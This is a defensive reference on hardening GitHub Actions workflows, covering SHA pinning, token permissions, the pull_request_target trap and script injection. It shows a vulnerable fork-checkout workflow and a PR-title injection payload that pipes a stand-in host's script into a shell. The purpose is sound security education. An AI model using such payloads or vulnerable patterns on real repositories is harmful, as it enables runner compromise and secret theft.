# GitHub Actions Hardening Reference

Load this when auditing the `.github/workflows/` directory or when explaining workflow-level mitigations.

## Action pinning by SHA — the why and the how

### Why SHA, not tag

Tags in Git are mutable references. An action published as `foo/bar@v3` today can point to a different commit tomorrow — the upstream maintainer (or an attacker with maintainer access) can re-tag at will. SHA pinning makes the reference immutable.

The most cited example: the **tj-actions/changed-files compromise (March 2025)** showed how a popular action with mutable tags can be repointed to malicious code, exposing every workflow secret. SHA pinning would have contained it.

### Pin format

Bad — tag pinning:
```yaml
- uses: actions/checkout@v4
- uses: tj-actions/changed-files@v44
```

Good — SHA pin with version comment:
```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: tj-actions/changed-files@cbda684547adc8c052d50711417e44fe2bc6e478  # v45.0.5
```

The trailing comment is not decoration — it's how reviewers and Dependabot understand what version is pinned. Without it, you have an opaque SHA and no upgrade path.

### Exception: first-party `actions/*`

GitHub-owned actions (`actions/checkout`, `actions/setup-node`, `actions/cache`, etc.) can reasonably be pinned by major version when the threat model is "upstream compromise". The exception exists because GitHub itself is the trust root. For maximum strictness, pin them by SHA too.

### Automation

Use [`pinact`](https://github.com/suzuki-shunsuke/pinact) or [`stepsecurity-bot`](https://app.stepsecurity.io/) to pin existing workflows. Dependabot understands SHA pins and bumps them while preserving the comment.

## GITHUB_TOKEN permissions

### The default is too permissive

If a workflow has no `permissions:` block at all, the `GITHUB_TOKEN` defaults to either `permissive` (write to most scopes) or `restricted` (read-only contents) depending on the repository setting at `Settings → Actions → General → Workflow permissions`. **Never rely on the repo default** — declare permissions explicitly at the workflow or job level.

### Pattern: least-privilege block at workflow level

```yaml
name: CI
on:
  pull_request:

permissions: {}  # nothing by default

jobs:
  test:
    permissions:
      contents: read       # checkout
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>  # v4
      - run: npm test

  comment-on-pr:
    permissions:
      contents: read
      pull-requests: write  # only this job can post comments
    runs-on: ubuntu-latest
    steps:
      - run: gh pr comment ${{ github.event.pull_request.number }} --body "..."
```

The empty top-level `permissions: {}` is the safest default. Each job opts into exactly what it needs.

### Scopes worth knowing

| Scope | What it does |
|-------|--------------|
| `contents` | Read or write repo contents. `write` lets a step push commits. |
| `pull-requests` | Create, comment on, or merge PRs. |
| `issues` | Create or comment on issues. |
| `actions` | Re-run, cancel, or delete other workflow runs. `write` is rare and dangerous. |
| `packages` | Read/publish to GitHub Packages registries. |
| `id-token` | **Required for OIDC**. Lets the workflow request an OIDC token. |
| `security-events` | Upload SARIF results to code scanning. |
| `attestations` | Generate build attestations (SLSA). |

Set every scope you don't need to nothing (omit it, since `permissions: {}` means none).

## The `pull_request_target` trap

`pull_request_target` triggers on PRs but runs in the context of the base branch with full secrets and a write `GITHUB_TOKEN`. It's intended for things like labeling or commenting on PRs from forks — operations that need write access without trusting fork code.

### The dangerous pattern

```yaml
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out fork code
      - run: npm install && npm test                       # ← runs fork code with secrets
```

This pattern executes arbitrary code from forks with full write tokens and secrets. It is equivalent to giving every external PR author repo-admin access.

### Safe patterns

If you must build PRs from forks with secrets:
1. Use `pull_request` (not `_target`) — secrets are not available, write token is not granted. Run the dangerous build there.
2. Use `pull_request_target` only for the metadata operations (labeling, commenting), without ever checking out PR head code.
3. If both are required, gate the `pull_request_target` build behind a manual approval (GitHub environment with required reviewers).

### Detection

Grep for the combination:
```bash
grep -rl 'pull_request_target' .github/workflows/ \
  | xargs grep -l 'pull_request.head' 2>/dev/null
```
Every match is a finding to triage at High or Critical.

## Script injection via GitHub context

User-controlled values in shell run blocks are injection vectors:

```yaml
# BAD — title is attacker-controlled
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl evil.example.com | sh; #` runs arbitrary code on the runner.

Mitigations:
1. Pass via env, never inline interpolation:
   ```yaml
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: echo "Title: $TITLE"
   ```
2. Validate format before use (regex, length cap).
3. Run untrusted content in a sandboxed step (container, no secrets).

## Workflow review checklist

For each workflow file, in order:

1. Is there a `permissions:` block? If not → finding.
2. Are all third-party `uses:` pinned by SHA with a version comment? Each non-SHA → finding.
3. Does it use `pull_request_target`? If yes → trace every step for fork-code execution.
4. Does any `run:` block interpolate `${{ github.event.* }}` directly? Each one → finding.
5. Does it use a self-hosted runner? If yes → confirm ephemeral and not exposed to public PRs.
6. Are secrets passed to any unpinned third-party action? → finding.
